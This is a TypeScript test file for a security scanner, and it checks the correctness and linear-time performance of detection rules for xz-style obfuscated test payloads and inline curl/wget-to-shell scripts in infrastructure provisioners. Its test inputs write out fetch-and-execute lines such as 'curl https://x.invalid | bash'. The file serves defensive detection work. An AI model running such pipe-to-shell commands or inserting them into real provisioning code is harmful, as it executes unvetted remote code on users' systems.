import { performance } from "node:perf_hooks";
import { describe, expect, it } from "vitest";
import {
  ALL_PATTERN_SETS,
  matchPatternInContent,
} from "../patterns.js";
import type { PatternEntry } from "../types.js";

const shippedRule = (rule: string): PatternEntry => {
  const entry = ALL_PATTERN_SETS
    .flatMap(([, patterns]) => patterns)
    .find((candidate) => candidate.rule === rule);
  if (!entry) throw new Error(`Missing shipped rule: ${rule}`);
  return entry as PatternEntry;
};

const regexOnly = (entry: PatternEntry): PatternEntry => ({
  ...entry,
  correlatedMatcher: undefined,
});

describe("near-linear shipped single-line matchers", () => {
  it.each([
    ["XZ_OBFUSCATED_TEST", "tests/files/payload.xz data head data tr", "g", [1]],
    ["XZ_OBFUSCATED_TEST", "xz -d payload | head -c 1024", "g", [1]],
    ["XZ_OBFUSCATED_TEST", ".xz -d payload | head -c", "g", [1]],
    ["XZ_OBFUSCATED_TEST", "tests/files/payload.xz head\ntr", "g", []],
    ["XZ_OBFUSCATED_TEST", "tests/files/payload.xz\u2028head tr", "g", []],
    ["XZ_OBFUSCATED_TEST", "tests/files/payload.xz head contract", "g", []],
    ["XZ_OBFUSCATED_TEST", "TESTS/files/payload.xz head tr", "g", []],
    ["IAC_INLINE_SCRIPT", "provisioner local curl https://x.invalid | bash", "g", [1]],
    ["IAC_INLINE_SCRIPT", "user_data wget https://x.invalid | sh", "g", [1]],
    ["IAC_INLINE_SCRIPT", "provisioner curl x | bash more | sh", "g", [1]],
    ["IAC_INLINE_SCRIPT", "inlinecurl payload | bash", "g", [1]],
    ["IAC_INLINE_SCRIPT", "provisioner curl \r| bash", "g", [1]],
    ["IAC_INLINE_SCRIPT", "provisioner curl x | \rsh more | sh", "g", [1]],
    ["IAC_INLINE_SCRIPT", "provisioner curl \rjunk curl \rpayload | bash", "g", []],
    ["IAC_INLINE_SCRIPT", "provisioner\u2028curl payload | sh", "g", []],
    ["IAC_INLINE_SCRIPT", "provisioner curl payload\u2028| sh", "g", []],
    ["IAC_INLINE_SCRIPT", "provisioner\ncurl payload | sh", "g", []],
    ["IAC_INLINE_SCRIPT", "PROVISIONER curl payload | bash", "g", []],
  ] as const)(
    "preserves regex parity for %s: %s",
    (rule, content, flags, expectedLines) => {
      const structural = shippedRule(rule);
      const baselineHits = matchPatternInContent(regexOnly(structural), content, flags);
      const baselineLines = baselineHits.map((hit) => hit.line);
      const structuralHits = matchPatternInContent(structural, content, flags);

      expect(baselineLines, `${rule} regex baseline`).toEqual(expectedLines);
      expect(structuralHits.map((hit) => hit.line), `${rule} structural matcher`)
        .toEqual(baselineLines);
      expect(structuralHits.map((hit) => hit.match.index), `${rule} start offsets`)
        .toEqual(baselineHits.map((hit) => hit.match.index));
      expect(structuralHits.map((hit) => hit.text), `${rule} evidence`)
        .toEqual(baselineHits.map((hit) => hit.text));
      expect(structuralHits.coverage.complete).toBe(true);
      expect(structuralHits.coverage.regexAttempts).toBe(1);
    },
  );

  it("preserves late positives and bounded evidence beyond 6,000 characters", () => {
    const padding = "x".repeat(6_000);
    const cases = [
      [
        "XZ_OBFUSCATED_TEST",
        `tests/files/${padding}.xz ${padding} head ${padding} tr`,
      ],
      [
        "IAC_INLINE_SCRIPT",
        `provisioner ${padding}curl ${padding}| bash`,
      ],
    ] as const;

    for (const [rule, content] of cases) {
      const found = matchPatternInContent(shippedRule(rule), content, "g");
      expect(found, rule).toHaveLength(1);
      expect(found[0]!.match.index, rule).toBeGreaterThanOrEqual(0);
      expect(found[0]!.text.length, rule).toBeLessThanOrEqual(240);
      expect(found.coverage.complete, rule).toBe(true);
    }
  });

  it("scans concrete 5 MiB repeated-prefix near misses in practical linear time", { timeout: 15_000 }, () => {
    const fiveMiB = 5 * 1024 * 1024;
    const cases = [
      ["XZ_OBFUSCATED_TEST", "tests/files/x.xz x"],
      ["IAC_INLINE_SCRIPT", "provisioner curl "],
    ] as const;

    const started = performance.now();
    for (const [rule, unit] of cases) {
      const content = unit.repeat(Math.ceil(fiveMiB / unit.length)).slice(0, fiveMiB);
      const found = matchPatternInContent(shippedRule(rule), content, "g");
      expect(found, rule).toEqual([]);
      expect(found.coverage.complete, rule).toBe(true);
      expect(found.coverage.regexAttempts, rule).toBe(1);
    }
    expect(performance.now() - started).toBeLessThan(5_000);
  });
});